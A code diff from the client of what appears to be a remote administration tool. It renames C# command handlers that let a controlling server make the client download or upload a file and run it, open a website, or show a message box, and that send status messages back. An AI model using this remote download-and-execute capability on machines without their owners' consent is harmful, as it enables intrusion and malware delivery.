@@ -12,10 +12,10 @@ namespace xClient.Core.Commands
     /* THIS PARTIAL CLASS SHOULD CONTAIN MISCELLANEOUS METHODS. */
     public static partial class CommandHandler
     {
-        public static void HandleDownloadAndExecuteCommand(Packets.ServerPackets.DownloadAndExecute command,
+        public static void HandleDoDownloadAndExecute(Packets.ServerPackets.DoDownloadAndExecute command,
             Client client)
         {
-            new Packets.ClientPackets.Status("Downloading file...").Execute(client);
+            new Packets.ClientPackets.SetStatus("Downloading file...").Execute(client);
 
             new Thread(() =>
             {
@@ -32,11 +32,11 @@ namespace xClient.Core.Commands
                 }
                 catch
                 {
-                    new Packets.ClientPackets.Status("Download failed!").Execute(client);
+                    new Packets.ClientPackets.SetStatus("Download failed!").Execute(client);
                     return;
                 }
 
-                new Packets.ClientPackets.Status("Downloaded File!").Execute(client);
+                new Packets.ClientPackets.SetStatus("Downloaded File!").Execute(client);
 
                 try
                 {
@@ -59,15 +59,15 @@ namespace xClient.Core.Commands
                 catch
                 {
                     DeleteFile(tempFile);
-                    new Packets.ClientPackets.Status("Execution failed!").Execute(client);
+                    new Packets.ClientPackets.SetStatus("Execution failed!").Execute(client);
                     return;
                 }
 
-                new Packets.ClientPackets.Status("Executed File!").Execute(client);
+                new Packets.ClientPackets.SetStatus("Executed File!").Execute(client);
             }).Start();
         }
 
-        public static void HandleUploadAndExecute(Packets.ServerPackets.UploadAndExecute command, Client client)
+        public static void HandleDoUploadAndExecute(Packets.ServerPackets.DoUploadAndExecute command, Client client)
         {
             string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                 command.FileName);
@@ -81,7 +81,7 @@ namespace xClient.Core.Commands
 
                 if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                 {
-                    new Packets.ClientPackets.Status(string.Format("Writing failed: {0}", destFile.LastError)).Execute(
+                    new Packets.ClientPackets.SetStatus(string.Format("Writing failed: {0}", destFile.LastError)).Execute(
                         client);
                     return;
                 }
@@ -100,17 +100,17 @@ namespace xClient.Core.Commands
                     startInfo.FileName = filePath;
                     Process.Start(startInfo);
 
-                    new Packets.ClientPackets.Status("Executed File!").Execute(client);
+                    new Packets.ClientPackets.SetStatus("Executed File!").Execute(client);
                 }
             }
             catch (Exception ex)
             {
                 DeleteFile(filePath);
-                new Packets.ClientPackets.Status(string.Format("Execution failed: {0}", ex.Message)).Execute(client);
+                new Packets.ClientPackets.SetStatus(string.Format("Execution failed: {0}", ex.Message)).Execute(client);
             }
         }
 
-        public static void HandleVisitWebsite(Packets.ServerPackets.VisitWebsite command, Client client)
+        public static void HandleDoVisitWebsite(Packets.ServerPackets.DoVisitWebsite command, Client client)
         {
             string url = command.URL;
 
@@ -141,11 +141,11 @@ namespace xClient.Core.Commands
                     }
                 }
 
-                new Packets.ClientPackets.Status("Visited Website").Execute(client);
+                new Packets.ClientPackets.SetStatus("Visited Website").Execute(client);
             }
         }
 
-        public static void HandleShowMessageBox(Packets.ServerPackets.ShowMessageBox command, Client client)
+        public static void HandleDoShowMessageBox(Packets.ServerPackets.DoShowMessageBox command, Client client)
         {
             new Thread(() =>
             {
@@ -154,7 +154,7 @@ namespace xClient.Core.Commands
                     (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon));
             }).Start();
 
-            new Packets.ClientPackets.Status("Showed Messagebox").Execute(client);
+            new Packets.ClientPackets.SetStatus("Showed Messagebox").Execute(client);
         }
     }
 }
